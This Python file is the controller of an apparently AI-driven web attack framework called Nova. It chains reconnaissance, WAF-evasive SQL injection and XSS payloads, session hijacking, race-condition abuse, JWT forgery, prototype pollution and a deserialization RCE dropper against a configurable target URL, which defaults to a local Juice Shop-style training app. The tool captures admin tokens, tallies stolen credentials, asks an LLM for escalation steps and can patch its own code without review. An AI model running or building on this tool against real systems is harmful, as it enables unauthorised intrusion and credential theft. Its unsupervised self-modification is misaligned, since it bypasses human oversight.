#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║   🦅 NOVA UNIFIED CORE v3.0 — INTELLIGENCE UPGRADED            ║
║                                                                  ║
║   Built on v2.0 foundation (9 phases, all modules intact).      ║
║   Upgrades added in v3.0:                                        ║
║   • Phase 0  — Pre-hunt RAG intelligence briefing               ║
║   • Phase 10 — Post-hunt learning (findings → knowledge base)   ║
║   • RAG query before every phase (what do we know about this?)  ║
║   • Payload engine replaces static payloads in phases 2 & 3     ║
║   • LLM reasoning scores and escalates every confirmed finding  ║
║   • Swarm mode available as alternate execution path            ║
╚══════════════════════════════════════════════════════════════════╝
"""

import json
import time
import sys
import os
import re
import base64
import requests
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ── Original v2.0 imports (unchanged) ────────────────────────────
from nova_adaptive_brain      import NovaAdaptiveBrain
from nova_exploit_synthesizer import NovaExploitSynthesizer
from nova_fuzzer_fix          import NovaFuzzer
from nova_session_hijacker    import NovaSessionHijacker
from nova_race_engine         import NovaRaceEngine
from nova_jwt_forge           import NovaJWTForge
from nova_proto_polluter      import NovaProtoPolluter
from nova_deserialize_dropper import NovaDeserializeDropper
from nova_feedback_cortex     import NovaFeedbackCortex

# ── v3.0 new intelligence imports ────────────────────────────────
try:
    from nova_reasoning_core  import NovaReasoningCore, get_reasoning_core
    from nova_knowledge_rag   import NovaKnowledgeRAG, get_rag
    from nova_payload_engine  import NovaPayloadEngine
    _INTELLIGENCE_AVAILABLE = True
except ImportError as _ie:
    print(f"  ⚠️  Intelligence modules not loaded: {_ie}")
    _INTELLIGENCE_AVAILABLE = False

# Optional: swarm mode
try:
    from nova_swarm import SwarmCoordinator
    _SWARM_AVAILABLE = True
except ImportError:
    _SWARM_AVAILABLE = False

# Optional: self-improvement
try:
    from nova_evolver import NovaEvolver
    _EVOLVER_AVAILABLE = True
except ImportError:
    _EVOLVER_AVAILABLE = False


class NovaCore:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url    = base_url
        self.start_time  = None
        self.findings    = {"critical": [], "high": [], "medium": [], "low": []}
        self.admin_token = self._load_token()
        self.leaked_paths= self._load_paths()
        self.mission_log = []

        # v3.0 intelligence layer (graceful if unavailable)
        if _INTELLIGENCE_AVAILABLE:
            self.reasoning = get_reasoning_core()
            self.rag       = get_rag()
            self.payloads  = NovaPayloadEngine(reasoning=self.reasoning)
        else:
            self.reasoning = None
            self.rag       = None
            self.payloads  = None

    # ── v2.0 helpers (unchanged) ──────────────────────────────────

    def _load_token(self):
        try:
            with open("nova_extracted_token.json", "r") as f:
                data  = json.load(f)
                token = data.get("token", "")
                if token:
                    print(f"  🔑 Loaded admin token: {token[:50]}...")
                    return token
        except Exception:
            pass
        return None

    def _load_paths(self):
        try:
            with open("nova_leaked_paths.json", "r") as f:
                data  = json.load(f)
                paths = data.get("leaked_paths", [])
                if paths:
                    print(f"  📁 Loaded {len(paths)} leaked file paths")
                    return paths
        except Exception:
            pass
        return []

    def log(self, msg, level="INFO"):
        entry = f"[{datetime.now().strftime('%H:%M:%S')}] [{level}] {msg}"
        print(f"  {entry}")
        self.mission_log.append(entry)

    def add_finding(self, finding, severity="medium"):
        self.findings.setdefault(severity, []).append(finding)

    # ── v3.0 helpers ──────────────────────────────────────────────

    def _rag_brief(self, topic: str, phase_name: str) -> str:
        """Query knowledge base for what Nova knows about this phase's topic."""
        if not self.rag:
            return ""
        try:
            result  = self.rag.query(topic, limit=3, use_llm_expansion=False)
            if not result["results"]:
                return ""
            titles  = [r["title"] for r in result["results"][:3]]
            brief   = f"\n  📚 RAG briefing for {phase_name}:"
            for t in titles:
                brief += f"\n     • {t}"
            print(brief)
            return brief
        except Exception:
            return ""

    def _smart_payloads(self, vuln_type: str, count: int = 12,
                        waf_mode: bool = True) -> list:
        """Get evolved payloads from payload engine, fall back to empty."""
        if not self.payloads:
            return []
        try:
            return self.payloads.generate(vuln_type, count=count, waf_mode=waf_mode)
        except Exception:
            return []

    def _llm_escalate(self, finding: dict) -> dict:
        """Ask LLM to reason about a finding and suggest escalation."""
        if not self.reasoning or not self.reasoning.available:
            return {}
        try:
            return self.reasoning.reason_about_finding(finding)
        except Exception:
            return {}

    def _log_rag_finding(self, finding: dict):
        """Feed a confirmed finding back into the knowledge base."""
        if not self.rag:
            return
        try:
            if finding.get("verdict") in ("confirmed", "likely") or \
               finding.get("success") is True:
                self.rag.learn_from_finding(finding, target_url=self.base_url)
        except Exception:
            pass

    # ── PHASE 0 — v3.0 new ───────────────────────────────────────

    def phase_0_intelligence_briefing(self):
        """
        Pre-hunt intelligence briefing.
        Queries the knowledge base for:
        - Known vulnerabilities for this stack
        - Highest-value techniques to try first
        - CVEs relevant to discovered tech
        """
        if not self.rag:
            return

        print("\n" + "=" * 60)
        print("🧠 PHASE 0: INTELLIGENCE BRIEFING (v3.0)")
        print("=" * 60)

        # Discover tech stack via quick fingerprint
        tech_stack = []
        try:
            r = requests.get(self.base_url, timeout=8)
            if "angular" in r.text.lower():   tech_stack.append("Angular")
            if "express" in r.text.lower():   tech_stack.append("Express.js")
            if "node"    in r.text.lower():   tech_stack.append("Node.js")
            xpb = r.headers.get("x-powered-by", "")
            if xpb: tech_stack.append(xpb)
        except Exception:
            pass

        if tech_stack:
            self.log(f"Stack detected: {', '.join(tech_stack)}")

        # Query RAG for attack briefing
        briefing = self.rag.get_attack_briefing({
            "tech_stack": tech_stack,
            "url":        self.base_url,
        })

        if briefing.get("techniques"):
            print(f"  📚 Top techniques for this stack:")
            for t in briefing["techniques"][:4]:
                print(f"     • {t['title']}")
        if briefing.get("cves"):
            print(f"  📋 Relevant CVEs ({len(briefing['cves'])} found):")
            for c in briefing["cves"][:3]:
                sev = c.get("severity", "?")
                print(f"     [{sev.upper()}] {c['title'][:70]}")

        # Also query for the most critical things to try
        if self.reasoning and self.reasoning.available:
            prompt = (
                f"Target: {self.base_url} | Stack: {tech_stack}\n"
                "What are the 3 most likely critical findings for a Juice Shop-style app? "
                "Return JSON array: [{\"attack\": \"...\", \"why\": \"...\"}]"
            )
            result = self.reasoning._chat([{"role": "user", "content": prompt}], max_tokens=400)
            parsed = self.reasoning._parse_json(result)
            if isinstance(parsed, list) and parsed:
                print("  🎯 LLM priority targets:")
                for item in parsed[:3]:
                    print(f"     → {item.get('attack','?')}: {item.get('why','')[:60]}")

        self.log("Intelligence briefing complete")

    # ── ORIGINAL PHASES (v2.0, unchanged logic) ──────────────────
    # Each phase now gets a RAG brief before running and feeds
    # findings back into the knowledge base after.

    def phase_1_recon(self):
        print("\n" + "=" * 60)
        print("🟢 PHASE 1/9: RECONNAISSANCE")
        print("=" * 60)
        self._rag_brief("web application reconnaissance endpoint enumeration", "Recon")
        brain = NovaAdaptiveBrain(base_url=self.base_url)
        brain.map_attack_surface()
        self.log(f"Profiled {len(brain.application_map)} endpoints")
        return brain

    def phase_2_exploit(self):
        print("\n" + "=" * 60)
        print("🔴 PHASE 2/9: EXPLOITATION  [v3.0: polymorphic payloads]")
        print("=" * 60)
        self._rag_brief("SQL injection authentication bypass exploitation", "Exploit")

        synth   = NovaExploitSynthesizer(base_url=self.base_url)

        # v3.0: inject smart payloads into the synthesizer when available
        sqli_payloads = self._smart_payloads("sql_injection", count=10, waf_mode=True)
        xss_payloads  = self._smart_payloads("xss_reflected", count=8,  waf_mode=True)
        if sqli_payloads:
            self.log(f"Using {len(sqli_payloads)} evolved SQLi payloads")
            if hasattr(synth, "custom_payloads"):
                synth.custom_payloads = sqli_payloads
        if xss_payloads:
            self.log(f"Using {len(xss_payloads)} evolved XSS payloads")

        targets = [
            {"endpoint": "/rest/products/search", "method": "GET",  "params": ["q"],                      "sink": "sql_injection"},
            {"endpoint": "/rest/user/login",       "method": "POST", "params": ["email", "password"],       "sink": "auth_bypass"},
        ]
        for t in targets:
            synth.exploit_path(path=[t], sink_type=t["sink"], confidence="HIGH")

        for r in synth.results:
            if r.get("success") is True:
                ind = r.get("indicators_found", [])
                sev = "critical" if any(i in ind for i in ["password", "admin", "token"]) else "high"
                finding = {
                    "type":         r.get("exploit_type", "unknown"),
                    "endpoint":     r.get("endpoint", ""),
                    "payload":      r.get("payload", ""),
                    "data_exposed": ind,
                    "verdict":      "confirmed",
                }
                self.add_finding(finding, sev)
                self._log_rag_finding(finding)

                # v3.0: LLM escalation analysis
                escalation = self._llm_escalate(finding)
                if escalation.get("next_step"):
                    self.log(f"Escalation hint: {escalation['next_step'][:80]}", "INTEL")

                if "token" in ind or "authentication" in ind:
                    matches = re.findall(r'(eyJ[A-Za-z0-9\-._~+/]+=*)',
                                         r.get("response_preview", ""))
                    for tok in matches:
                        if len(tok) > 50 and not self.admin_token:
                            self.admin_token = tok
                            self.log(f"Token captured from exploit: {tok[:40]}...")

        self.log(f"Exploits: {len([r for r in synth.results if r.get('success')])} successful")
        return synth

    def phase_3_fuzz(self):
        print("\n" + "=" * 60)
        print("🟡 PHASE 3/9: FUZZING  [v3.0: polymorphic payloads]")
        print("=" * 60)
        self._rag_brief("fuzzing XSS SQL injection input validation bypass", "Fuzz")

        fuzzer = NovaFuzzer(base_url=self.base_url)

        # v3.0: inject evolved payloads into fuzzer when it supports them
        sqli_payloads = self._smart_payloads("sql_injection", count=12, waf_mode=True)
        xss_payloads  = self._smart_payloads("xss_reflected", count=10, waf_mode=True)
        if sqli_payloads and hasattr(fuzzer, "sql_payloads"):
            fuzzer.sql_payloads = sqli_payloads
        if xss_payloads  and hasattr(fuzzer, "xss_payloads"):
            fuzzer.xss_payloads = xss_payloads
        if sqli_payloads or xss_payloads:
            self.log(f"Fuzzer armed with {len(sqli_payloads)} SQLi + {len(xss_payloads)} XSS evolved payloads")

        report = fuzzer.fuzz_targets([
            {"endpoint": "/rest/products/search",  "params": ["q"],              "fuzz_types": ["sql_injection", "xss"]},
            {"endpoint": "/rest/user/login",        "method": "POST", "params": ["email", "password"], "fuzz_types": ["sql_injection"]},
            {"endpoint": "/api/Feedbacks",          "method": "POST", "params": ["comment"],            "fuzz_types": ["xss", "sql_injection"]},
        ], intensity="low")

        self.log(f"Anomalies: {report.get('anomalies_found', 0)}")
        if report.get("critical", 0) > 0:
            finding = {"type": "fuzzer_anomalies", "critical": report["critical"], "verdict": "likely"}
            self.add_finding(finding, "high")
            self._log_rag_finding(finding)
        return fuzzer

    def phase_4_hijack(self):
        print("\n" + "=" * 60)
        print("🟣 PHASE 4/9: SESSION HIJACKING")
        print("=" * 60)
        self._rag_brief("session fixation hijacking cookie token theft", "Session Hijack")
        hijacker = NovaSessionHijacker(base_url=self.base_url)
        report   = hijacker.run_full_hijack(initial_token=self.admin_token)
        if report.get("fixation_results"):
            for r in report["fixation_results"]:
                if r.get("success"):
                    finding = {"type": "session_fixation", "endpoint": r.get("endpoint", ""), "verdict": "confirmed"}
                    self.add_finding(finding, "medium")
                    self._log_rag_finding(finding)
        self.log(f"Fixation: {len([r for r in report.get('fixation_results', []) if r.get('success')])} successful")
        return hijacker

    def phase_5_race(self):
        print("\n" + "=" * 60)
        print("🟠 PHASE 5/9: RACE CONDITIONS")
        print("=" * 60)
        self._rag_brief("race condition limit override concurrent request vulnerability", "Race")
        racer  = NovaRaceEngine(base_url=self.base_url)
        report = racer.run_full_race_suite(auth_token=self.admin_token)
        for a in report.get("attacks", []):
            if a.get("vulnerable"):
                finding = {"type": a.get("attack_type", "race"), "detail": a, "verdict": "confirmed"}
                sev     = "high" if a.get("attack_type") == "rate_limit_bypass" else "medium"
                self.add_finding(finding, sev)
                self._log_rag_finding(finding)
        self.log(f"Vulnerabilities: {report.get('vulnerable_count', 0)}")
        return racer

    def phase_6_jwt(self):
        print("\n" + "=" * 60)
        print("🔐 PHASE 6/9: JWT ATTACKS")
        print("=" * 60)
        if not self.admin_token:
            self.log("No JWT token — skipping.", "WARN")
            return None
        self._rag_brief("JWT algorithm confusion none attack weak secret HMAC RS256", "JWT")
        print(f"  Using token: {self.admin_token[:60]}...")
        forge  = NovaJWTForge(base_url=self.base_url)
        report = forge.run_full_forge(self.admin_token)
        if report.get("successful_forgeries"):
            finding = {"type": "jwt_forgery", "count": len(report["successful_forgeries"]), "verdict": "confirmed"}
            self.add_finding(finding, "critical")
            self._log_rag_finding(finding)
            escalation = self._llm_escalate(finding)
            if escalation.get("next_step"):
                self.log(f"JWT escalation: {escalation['next_step'][:80]}", "INTEL")
        return forge

    def phase_7_proto(self):
        print("\n" + "=" * 60)
        print("☣️  PHASE 7/9: PROTOTYPE POLLUTION")
        print("=" * 60)
        self._rag_brief("prototype pollution __proto__ constructor JavaScript Node.js", "Proto Pollute")
        polluter = NovaProtoPolluter(base_url=self.base_url)
        report   = polluter.run_full_pollution_campaign()
        if report.get("successful_pollutions", 0) > 0:
            finding = {"type": "prototype_pollution", "count": report["successful_pollutions"], "verdict": "confirmed"}
            self.add_finding(finding, "critical")
            self._log_rag_finding(finding)
        self.log(f"Attempts: {report.get('total_attempts', 0)} | Success: {report.get('successful_pollutions', 0)}")
        return polluter

    def phase_8_deserialize(self):
        print("\n" + "=" * 60)
        print("💣 PHASE 8/9: DESERIALIZATION")
        print("=" * 60)
        self._rag_brief("deserialization RCE Node.js gadget chain serialize", "Deserialize")
        dropper = NovaDeserializeDropper(base_url=self.base_url, leaked_paths=self.leaked_paths)
        report  = dropper.run_dropper()
        if report.get("successful_chains"):
            finding = {"type": "deserialization", "chains": report["successful_chains"], "verdict": "confirmed"}
            self.add_finding(finding, "critical")
            self._log_rag_finding(finding)
        self.log(f"Gadget chains: {len(report.get('successful_chains', []))} successful")
        return dropper

    def phase_9_learn(self):
        print("\n" + "=" * 60)
        print("🧠 PHASE 9/9: LEARNING")
        print("=" * 60)
        cortex = NovaFeedbackCortex(base_url=self.base_url)
        report = cortex.process_results([])
        self.log(f"Credentials extracted: {report.get('total_stolen_credentials', 0)}")
        return cortex

    # ── PHASE 10 — v3.0 new ──────────────────────────────────────

    def phase_10_post_hunt_learning(self):
        """
        v3.0 only.
        Feed all confirmed findings back into the knowledge base.
        Optionally run one evolution cycle to improve Nova's own code.
        """
        print("\n" + "=" * 60)
        print("📚 PHASE 10: POST-HUNT LEARNING (v3.0)")
        print("=" * 60)

        all_findings = []
        for sev, items in self.findings.items():
            for f in items:
                f_copy = dict(f)
                f_copy.setdefault("severity", sev)
                all_findings.append(f_copy)

        # Feed into RAG
        if self.rag and all_findings:
            learned = 0
            for f in all_findings:
                try:
                    self.rag.learn_from_finding(f, target_url=self.base_url)
                    learned += 1
                except Exception:
                    pass
            stats = self.rag.stats()
            self.log(f"Ingested {learned} findings → RAG now has {stats['total']} documents")

        # LLM mission summary
        if self.reasoning and self.reasoning.available and all_findings:
            total    = len(all_findings)
            critical = sum(1 for f in all_findings if f.get("severity") == "critical")
            prompt   = (
                f"Mission complete on {self.base_url}. "
                f"{total} findings ({critical} critical): "
                f"{json.dumps([f.get('type') for f in all_findings[:10]])}\n\n"
                "Write a 3-sentence executive summary and identify the single most dangerous finding."
            )
            summary = self.reasoning.think(prompt, max_tokens=300)
            if summary:
                print(f"\n  🦅 Mission Intelligence Summary:\n  {summary.strip()[:400]}\n")

        # Optional: one evolution cycle (dry-run by default)
        if _EVOLVER_AVAILABLE:
            evolve = os.getenv("NOVA_AUTO_EVOLVE", "").lower() in ("1", "true", "yes")
            if evolve:
                self.log("Running self-improvement cycle (NOVA_AUTO_EVOLVE=1)...")
                try:
                    repo    = os.path.dirname(os.path.abspath(__file__))
                    evolver = NovaEvolver(reasoning=self.reasoning, repo_path=repo, dry_run=False)
                    result  = evolver.evolve(max_patches=2, improvement_goal="reliability and error handling")
                    self.log(f"Evolver: {result['applied']} patches applied")
                except Exception as e:
                    self.log(f"Evolver skipped: {e}", "WARN")

        self.log("Post-hunt learning complete")

    # ── MISSION RUNNERS ───────────────────────────────────────────

    def run_full_mission(self):
        self.start_time = time.time()
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║   🦅  NOVA UNIFIED CORE v3.0 — FULL MISSION  🦅             ║
║   11 Phases  •  Token: {'YES' if self.admin_token else 'NO':<3}  •  Paths: {len(self.leaked_paths):<3}               ║
║   Intelligence: {'ON ' if _INTELLIGENCE_AVAILABLE else 'OFF'}  •  Swarm: {'ON ' if _SWARM_AVAILABLE else 'OFF'}  •  Evolver: {'ON ' if _EVOLVER_AVAILABLE else 'OFF'}     ║
╚══════════════════════════════════════════════════════════════╝""")

        try:
            self.phase_0_intelligence_briefing()
            time.sleep(0.2)
            self.phase_1_recon();       time.sleep(0.3)
            self.phase_2_exploit();     time.sleep(0.3)
            self.phase_3_fuzz();        time.sleep(0.3)
            self.phase_4_hijack();      time.sleep(0.3)
            self.phase_5_race();        time.sleep(0.3)
            self.phase_6_jwt();         time.sleep(0.3)
            self.phase_7_proto();       time.sleep(0.3)
            self.phase_8_deserialize(); time.sleep(0.3)
            self.phase_9_learn();       time.sleep(0.3)
            self.phase_10_post_hunt_learning()
        except KeyboardInterrupt:
            self.log("Mission interrupted", "WARN")
        except Exception as e:
            self.log(f"Error: {str(e)[:200]}", "ERROR")

        elapsed = round(time.time() - self.start_time, 2)
        self._report(elapsed)

    def run_swarm_mission(self, timeout: int = 300):
        """Alternate execution: launch the multi-agent swarm instead of sequential phases."""
        if not _SWARM_AVAILABLE:
            self.log("Swarm not available — falling back to full mission")
            return self.run_full_mission()

        self.start_time = time.time()
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║   🐝  NOVA SWARM MISSION v3.0                               ║
╚══════════════════════════════════════════════════════════════╝""")

        self.phase_0_intelligence_briefing()

        coordinator = SwarmCoordinator(
            base_url  = self.base_url,
            reasoning = self.reasoning,
        )
        swarm_result = coordinator.run(timeout=timeout)

        # Merge swarm findings into mission findings
        for f in swarm_result.get("findings", []):
            sev = f.get("severity", "medium")
            self.add_finding(f, sev)

        self.phase_10_post_hunt_learning()
        elapsed = round(time.time() - self.start_time, 2)
        self._report(elapsed)
        return swarm_result

    # ── REPORT (v2.0 + total count) ───────────────────────────────

    def _report(self, elapsed):
        total = sum(len(v) for v in self.findings.values())
        rag_count = self.rag.stats()["total"] if self.rag else 0
        print(f"""
╔══════════════════════════════════════════════════════════╗
║        NOVA v3.0 MISSION COMPLETE                       ║
╠══════════════════════════════════════════════════════════╣
║  Time: {elapsed:.1f}s  |  Phases: 11  |  Findings: {total:<4}        ║
║  Critical: {len(self.findings.get('critical',[])):<3}  High: {len(self.findings.get('high',[])):<3}  Med: {len(self.findings.get('medium',[])):<3}  Low: {len(self.findings.get('low',[])):<3}   ║
║  Token: {'✅' if self.admin_token else '❌'}   Paths: {len(self.leaked_paths):<3}   RAG docs: {rag_count:<5}     ║
╚══════════════════════════════════════════════════════════╝""")

        if self.findings["critical"]:
            print("🔥 CRITICAL:")
            for f in self.findings["critical"]:
                print(f"   💀 {f.get('type','?')}: {str(f.get('endpoint', f.get('detail','')))[:70]}")
        if self.findings["high"]:
            print("⚠️  HIGH:")
            for f in self.findings["high"]:
                print(f"   ⚡ {f.get('type','?')}")

        report = {
            "version":        "3.0",
            "timestamp":      datetime.now().isoformat(),
            "target":         self.base_url,
            "duration":       elapsed,
            "findings":       self.findings,
            "total":          total,
            "token_captured": bool(self.admin_token),
            "paths_leaked":   len(self.leaked_paths),
            "rag_documents":  rag_count,
            "intelligence":   _INTELLIGENCE_AVAILABLE,
            "mission_log":    self.mission_log,
        }
        with open("nova_unified_mission_report.json", "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n📁 Report → nova_unified_mission_report.json")
        print(f"🦅 Nova v3.0 Mission Complete — {total} findings in {elapsed}s.")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Nova Unified Core v3.0")
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--swarm",  action="store_true", help="Use swarm mode")
    args = parser.parse_args()

    nova = NovaCore(base_url=args.target)
    if args.swarm:
        nova.run_swarm_mission()
    else:
        nova.run_full_mission()
